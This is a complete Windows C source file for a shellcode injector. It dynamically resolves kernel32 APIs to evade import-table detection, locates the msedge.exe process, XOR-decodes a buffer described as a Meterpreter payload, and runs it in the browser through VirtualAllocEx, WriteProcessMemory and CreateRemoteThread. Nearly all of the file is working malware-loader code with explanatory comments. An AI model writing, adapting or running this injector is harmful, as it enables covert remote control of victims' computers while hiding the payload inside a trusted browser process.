#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "buffer.h" // Buffer containing the XORed Meterpreter payload

// Define function pointers for the APIs we will load dynamically
// These typedefs create aliases for function pointers corresponding to specific Windows API functions
typedef HANDLE(WINAPI* pfnCREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
typedef BOOL(WINAPI* pfnPROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* pfnPROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef LPVOID(WINAPI* pfnVIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* pfnWRITEPROCESSMEMORY)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE(WINAPI* pfnCREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI* pfnOPENPROCESS)(DWORD, BOOL, DWORD);

// Declare function pointers for each API function, initially set to NULL
pfnCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
pfnPROCESS32FIRST pProcess32First = NULL;
pfnPROCESS32NEXT pProcess32Next = NULL;
pfnVIRTUALALLOCEX pVirtualAllocEx = NULL;
pfnWRITEPROCESSMEMORY pWriteProcessMemory = NULL;
pfnCREATEREMOTETHREAD pCreateRemoteThread = NULL;
pfnOPENPROCESS pOpenProcess = NULL;

// Load all APIs dynamically
// This function retrieves the addresses of the specified functions from kernel32.dll
void LoadAPIs() {
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

    pCreateToolhelp32Snapshot = (pfnCREATETOOLHELP32SNAPSHOT)GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32First = (pfnPROCESS32FIRST)GetProcAddress(hKernel32, "Process32FirstW");
    pProcess32Next = (pfnPROCESS32NEXT)GetProcAddress(hKernel32, "Process32NextW");
    pVirtualAllocEx = (pfnVIRTUALALLOCEX)GetProcAddress(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory = (pfnWRITEPROCESSMEMORY)GetProcAddress(hKernel32, "WriteProcessMemory");
    pCreateRemoteThread = (pfnCREATEREMOTETHREAD)GetProcAddress(hKernel32, "CreateRemoteThread");
    pOpenProcess = (pfnOPENPROCESS)GetProcAddress(hKernel32, "OpenProcess");
}

/* 
 * This function performs an XOR encryption/decryption on the input data.
 *
 * @param data: Pointer to the data to be encrypted/decrypted
 * @param data_len: Length of the data
 *
 * The function XORs each byte of the input data with a fixed key (0xAA).
 * This is a simple and symmetric encryption method, meaning the same 
 * function can be used for both encryption and decryption.
 */
void XOR(unsigned char* data, size_t data_len) {
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ 0xAA;
    }
}

/*
 * This function finds the process ID (PID) of a target process by its name.
 *
 * @param target_process: Name of the target process (Unicode string)
 * 
 * @return process ID of the target process if found, otherwise 0.
 *
 * The function takes a snapshot of all processes in the system and then
 * iterates through them to find a process that matches the given name.
 * If a matching process is found, its process ID is returned.
 */
int FindTarget(const wchar_t* target_process) {
    if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
        LoadAPIs();
    }

    HANDLE hProcSnap;
    PROCESSENTRY32W pe32;
    int pid = 0;

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (INVALID_HANDLE_VALUE == hProcSnap) {
        return 0;
    } 

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!pProcess32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (pProcess32Next(hProcSnap, &pe32)) {
        if (lstrcmpiW(target_process, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);

    return pid;
}

/*
 * This function injects a given payload into a target process.
 *
 * @param hProc: Handle to the target process
 * @param buf: Pointer to the buffer containing the code to be injected
 * @param buf_len: Length of the buffer
 *
 * @return 0 if the injection is successful, otherwise -1.
 *
 * The function allocates memory in the target process for the code,
 * writes the code to this allocated memory, and then creates a remote
 * thread in the target process to execute the injected code.
 */
int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
    if (!pVirtualAllocEx || !pWriteProcessMemory || !pCreateRemoteThread) {
        LoadAPIs();
    }

    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = pVirtualAllocEx(hProc, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)buf, (SIZE_T)buf_len, NULL);

    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

/*
 * The entry point for the application. This function contains the main code for the shellcode injection.
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    LoadAPIs();  // Ensure APIs are loaded before use

    int pid = 0;
    HANDLE hProc = NULL;

    const wchar_t* target_process = L"msedge.exe";

    pid = FindTarget(target_process);

    if (pid == 0) {
        wprintf(L"failed to find %s process\n", target_process);
        return 0;
    }

    hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);

    if (hProc != NULL) {
        XOR(buf, sizeof(buf));
        Inject(hProc, buf, sizeof(buf));
        CloseHandle(hProc);
    }

    return 0;
}
